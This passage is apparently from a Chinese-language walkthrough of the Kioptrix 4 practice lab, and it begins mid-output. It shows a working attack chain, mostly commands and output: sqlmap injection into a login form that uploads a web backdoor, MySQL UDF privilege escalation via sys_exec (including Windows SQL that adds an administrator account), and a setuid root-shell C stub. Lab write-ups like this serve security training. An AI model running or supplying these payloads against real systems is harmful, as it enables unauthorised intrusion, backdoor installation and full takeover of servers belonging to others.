+----+----------+-----------------------+ 
通过 --os-shell 写入一个 webshell 。
root@kali:~# sqlmap -u http://10.32.58.187/checklogin.php --
data="myusername=admin&mypassword=123&Submit=Login" -p mypassword --os-shell 
        ___ 
       __H__ 
 ___ ___[']_____ ___ ___  {1.2.4#stable} 
|_ -| . [.]     | .'| . | 
|___|_  [(]_|_|_|__,|  _| 
      |_|V          |_|   http://sqlmap.org 
[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is 
illegal. It is the end user's responsibility to obey all applicable local, state and federal 
laws. Developers assume no liability and are not responsible for any misuse or damage caused by 
this program 
[*] starting at 02:09:06 
[02:09:06] [INFO] resuming back-end DBMS 'mysql'  
[02:09:06] [INFO] testing connection to the target URL 
[02:09:06] [INFO] heuristics detected web page charset 'ascii' 
sqlmap resumed the following injection point(s) from stored session: 
--- 
Parameter: mypassword (POST) 
    Type: boolean-based blind 
    Title: OR boolean-based blind - WHERE or HAVING clause (MySQL comment) 
    Payload: myusername=admin&mypassword=-8260' OR 6555=6555#&Submit=Login 
    Type: AND/OR time-based blind 
    Title: MySQL >= 5.0.12 OR time-based blind 
    Payload: myusername=admin&mypassword=123' OR SLEEP(5)-- UeQF&Submit=Login 
--- 
[02:09:06] [INFO] the back-end DBMS is MySQL 
web server operating system: Linux Ubuntu 8.04 (Hardy Heron) 
web application technology: PHP 5.2.4, Apache 2.2.8 
back-end DBMS: MySQL >= 5.0.12 
[02:09:06] [INFO] going to use a web backdoor for command prompt 
[02:09:06] [INFO] fingerprinting the back-end DBMS operating system 
[02:09:06] [INFO] the back-end DBMS operating system is Linux 
which web application language does the web server support? 
[1] ASP 
[2] ASPX 
[3] JSP 
[4] PHP (default) 
> 4 
[02:09:08] [INFO] retrieved the web server document root: '/var/www' 
[02:09:08] [INFO] retrieved web server absolute paths: '/var/www/checklogin.php' 
[02:09:08] [INFO] trying to upload the file stager on '/var/www/' via LIMIT 'LINES TERMINATED BY' 
method 
[02:09:08] [INFO] the file stager has been successfully uploaded on '/var/www/' - 
http://10.32.58.187:80/tmpuadle.php 
[02:09:08] [WARNING] unable to upload the file through the web file stager to '/var/www/' 
[02:09:08] [WARNING] backdoor has not been successfully uploaded through the file stager possibly 
because the user running the web server process has not write privileges over the folder where 
the user running the DBMS process was able to upload the file stager or because the DBMS and web 
server sit on different servers 
do you want to try the same method used for the file stager? [Y/n]  
[02:09:09] [INFO] the backdoor has been successfully uploaded on '/var/www/' - 
http://10.32.58.187:80/tmpbcphh.php 
[02:09:09] [INFO] calling OS shell. To quit type 'x' or 'q' and press ENTER 
os-shell> id 
do you want to retrieve the command standard output? [Y/n/a]  
command standard output:    'uid=33(www-data) gid=33(www-data) groups=33(www-data)' 
os-shell> whoami 
do you want to retrieve the command standard output? [Y/n/a]  
command standard output:    'www-data' 
os-shell> cat checklogin.php 
do you want to retrieve the command standard output? [Y/n/a]  
command standard output: 
--- 
 status; 
-------------- 
mysql  Ver 14.12 Distrib 5.0.51a, for debian-linux-gnu (i486) using readline 5.2 
Connection id:  
3520 
Current database: 
Current user: 
root@localhost 
SSL: 
Not in use 
Current pager:  
stdout 
Using outfile:  
'' 
Using delimiter: 
; 
Server version:  
5.0.51a-3ubuntu5.4 (Ubuntu) 
Protocol version: 
10 
Connection: 
Localhost via UNIX socket 
Server characterset: 
latin1 
Db     characterset: 
latin1 
Client characterset: 
latin1 
Conn.  characterset: 
latin1 
UNIX socket: 
/var/run/mysqld/mysqld.sock 
Uptime:  
1 hour 10 min 47 sec 
尝试 mysql udf 提权 。
在Windows环境下，执行命令
USE mysql; 
CREATE TABLE npn(line blob); 
INSERT INTO npn values(load_file('C://xampplite//htdocs//mail//lib_mysqludf_sys.dll')); 
SELECT * FROM mysql.npn INTO DUMPFILE 'c://windows//system32//lib_mysqludf_sys_32.dll'; 
CREATE FUNCTION sys_exec RETURNS integer SONAME 'lib_mysqludf_sys_32.dll'; 
SELECT sys_exec("net user npn npn12345678 /add"); 
SELECT sys_exec("net localgroup Administrators npn /add"); 
实现提权。
我们在实验环境下进行Linux环境下的UDF提权操作。
首先找到 lib_mysqludf_sys.so 的目录。
john@Kioptrix4:~$ whereis lib_mysqludf_sys.so 
lib_mysqludf_sys: /usr/lib/lib_mysqludf_sys.so 
mysql> use mysql; 
Reading table information for completion of table and column names 
You can turn off this feature to get a quicker startup with -A 
Database changed 
mysql> create function sys_exec returns integer soname 'lib_mysqludf_sys.so'; 
ERROR 1125 (HY000): Function 'sys_exec' already exists 
mysql> select sys_exec('id > /tmp/out; chown john.john /tmp/out'); 
ERROR 2006 (HY000): MySQL server has gone away 
No connection. Trying to reconnect... 
Connection id:    1 
Current database: mysql 
+-----------------------------------------------------+ 
| sys_exec('id > /tmp/out; chown john.john /tmp/out') | 
+-----------------------------------------------------+ 
| NULL                                                |  
+-----------------------------------------------------+ 
1 row in set (0.00 sec) 
mysql> quit 
Bye 
john@Kioptrix4:~$ cat /tmp/out 
uid=0(root) gid=0(root) 
这样就将 sys_exec() 函数执行的结果写入到了 /tmp/out 下。
得知可以得到root权限。
可以写一个c语言程序进行命令执行
#include  
#include  
#include  
int main(void) 
{ 
setuid(0); setgid(0); system(“/bin/bash”); 
} 
本地编译上传到目标靶机。
这里我用wget下载好像一下连接超时。可能是防火墙阻止流量。
mysql> SELECT sys_exec('usermod -a -G admin'); 
ERROR 2013 (HY000): Lost connection to MySQL server during query 
mysql> SELECT sys_exec('usermod -a -G admin john'); 
ERROR 2006 (HY000): MySQL server has gone away 
No connection. Trying to reconnect... 
Connection id:    1 
Current database: mysql 
+--------------------------------------+ 
| sys_exec('usermod -a -G admin john') | 
+--------------------------------------+ 
| NULL                                 |  
+--------------------------------------+ 
1 row in set (0.07 sec) 
利用 SELECT sys_exec('usermod -a -G admin'); 将 john 加入管理员组
john@Kioptrix4:/tmp$ sudo su 
[sudo] password for john:  
root@Kioptrix4:/tmp# id 
uid=0(root) gid=0(root) groups=0(root) 
root@Kioptrix4:/tmp# whoami 
root 
这样我们得到了root权限。